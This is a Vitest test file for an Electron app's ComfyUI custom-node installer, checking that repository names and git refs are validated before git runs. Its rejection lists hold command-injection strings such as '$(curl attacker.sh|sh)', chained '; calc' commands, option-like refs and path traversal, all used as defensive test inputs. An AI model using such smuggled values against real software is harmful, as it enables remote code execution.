import path from 'node:path'
import fs from 'fs'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { assertSafeCustomNodeRepoId, parseCustomNodeSpec } from '@/lib/customNodeRepoId'

const spawnProcessAsync = vi.hoisted(() => vi.fn(async () => ''))

vi.mock('electron', () => ({
  app: { isPackaged: false },
}))

vi.mock('../../../observability/logger', () => ({
  appLoggerInstance: { info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}))

vi.mock('../../../adapters/install/uvBasedBackends/uv', () => ({
  isPackageInstalled: vi.fn(async () => false),
  installPypiPackage: vi.fn(async () => {}),
  pipInstallRequirementsFromFile: vi.fn(async () => {}),
  installExtraWheels: vi.fn(async () => {}),
  aipgBaseDir: '/tmp/aipg',
}))

vi.mock('../../../adapters/install/osProcessHelper', () => ({
  spawnProcessAsync,
}))

import {
  downloadCustomNode,
  getGitBinaryPath,
  resolveCustomNodeDir,
  uninstallCustomNode,
} from '../../../adapters/backends/comfyuiTools'

const COMFY_ROOT = '/tmp/comfy'
const SHA = '939bb813f1c0ace959b62f20bb2da47190c4e211'

beforeEach(() => {
  spawnProcessAsync.mockClear()
  spawnProcessAsync.mockResolvedValue('')
  vi.spyOn(fs, 'existsSync').mockReturnValue(false)
  vi.spyOn(fs, 'rmSync').mockImplementation(() => {})
})

afterEach(() => {
  vi.restoreAllMocks()
})

describe('parseCustomNodeSpec', () => {
  it('accepts catalog owner/repo refs', () => {
    expect(parseCustomNodeSpec(`evanspearman/ComfyMath@${SHA}`)).toEqual({
      username: 'evanspearman',
      repoName: 'ComfyMath',
      gitRef: SHA,
    })
    expect(parseCustomNodeSpec('AcerPartner/VisionArt@AI-Playground')).toEqual({
      username: 'AcerPartner',
      repoName: 'VisionArt',
      gitRef: 'AI-Playground',
    })
    expect(parseCustomNodeSpec('Comfy-Org/ComfyUI-Manager')).toEqual({
      username: 'Comfy-Org',
      repoName: 'ComfyUI-Manager',
    })
  })

  it('rejects shell metacharacters, traversal, and option-like refs', () => {
    const rejected = [
      'a/b$(curl evil.sh|sh)',
      'evil/x; calc',
      'a/x&calc',
      'a/b@$(curl attacker.sh|sh)',
      'a/b@-b',
      '../repo',
      'owner/..',
      'owner/repo/extra',
    ]
    for (const spec of rejected) {
      expect(() => parseCustomNodeSpec(spec), spec).toThrow()
    }
  })
})

describe('assertSafeCustomNodeRepoId', () => {
  it('rejects ipc payloads that never pass through the preset parser', () => {
    expect(() => assertSafeCustomNodeRepoId({ username: 'a', repoName: 'x; calc' })).toThrow(
      'Invalid custom node repository name',
    )
    expect(() =>
      assertSafeCustomNodeRepoId({
        username: 'a',
        repoName: 'b',
        gitRef: '$(curl attacker.sh|sh)',
      }),
    ).toThrow('Invalid custom node git ref')
    expect(() => assertSafeCustomNodeRepoId({ username: '..', repoName: 'b' })).toThrow(
      'Invalid custom node username',
    )
    expect(() =>
      assertSafeCustomNodeRepoId({ username: 'a', repoName: 'b', gitRef: '-b' }),
    ).toThrow('Invalid custom node git ref')
  })
})

describe('resolveCustomNodeDir', () => {
  it('keeps the install directory inside custom_nodes', () => {
    const dir = resolveCustomNodeDir(COMFY_ROOT, '..foo')
    const root = path.resolve(COMFY_ROOT, 'custom_nodes')
    expect(dir).toBe(path.resolve(root, '..foo'))
    expect(dir.startsWith(root + path.sep)).toBe(true)
    expect(() => resolveCustomNodeDir(COMFY_ROOT, '..')).toThrow(
      'Invalid custom node repository name',
    )
  })
})

describe('downloadCustomNode', () => {
  it('clones and checks out with an argument array', async () => {
    const repoName = 'ComfyUI-GGUF'
    const dest = path.resolve(COMFY_ROOT, 'custom_nodes', repoName)
    const ok = await downloadCustomNode({ username: 'city96', repoName, gitRef: SHA }, COMFY_ROOT, {
      skipExtraWheels: true,
    })
    expect(ok).toBe(true)
    const git = getGitBinaryPath()
    expect(spawnProcessAsync).toHaveBeenNthCalledWith(
      1,
      git,
      ['clone', `https://github.com/city96/${repoName}`, dest],
      expect.any(Function),
      undefined,
      undefined,
    )
    expect(spawnProcessAsync).toHaveBeenNthCalledWith(
      2,
      git,
      ['checkout', SHA],
      expect.any(Function),
      undefined,
      dest,
    )
  })

  it('does not spawn git for a shell payload', async () => {
    await expect(
      downloadCustomNode({ username: 'a', repoName: 'b$(curl evil.sh|sh)' }, COMFY_ROOT),
    ).rejects.toThrow('Invalid custom node repository name')
    await expect(
      downloadCustomNode(
        { username: 'evil', repoName: 'x', gitRef: '$(curl attacker.sh|sh)' },
        COMFY_ROOT,
      ),
    ).rejects.toThrow('Invalid custom node git ref')
    expect(spawnProcessAsync).not.toHaveBeenCalled()
  })
})

describe('uninstallCustomNode', () => {
  it('does not delete outside custom_nodes', async () => {
    const rm = vi.spyOn(fs, 'rmSync')
    await expect(
      uninstallCustomNode({ username: 'a', repoName: '..' }, COMFY_ROOT),
    ).rejects.toThrow('Invalid custom node repository name')
    expect(rm).not.toHaveBeenCalled()
  })
})
